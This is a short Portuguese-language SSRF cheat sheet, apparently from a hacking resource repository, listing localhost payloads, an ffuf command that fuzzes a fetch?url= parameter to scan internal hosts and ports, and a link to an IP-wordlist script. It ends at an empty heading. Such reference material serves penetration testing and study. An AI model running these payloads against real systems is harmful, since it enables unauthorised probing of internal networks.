## Payloads
### Teste Básico
```
http://localhost
http://127.0.0.1
```
### Port Scanning
```
ffuf -u 'http://exemplo.com/fetch?url=HOST:PORT' -H 'Cookie: session=valor; id=valor' -w hosts.txt:HOST -w ports.txt:PORT'
```
### Scripts 
#### Criar lista de IPs: [ip_range_wordlist.sh](https://github.com/carineconstantino/hacking_br/blob/main/Resources/ssrf/ip_range_wordlist.sh)
#### Criar lists de IPs formato Hexdecimal:  

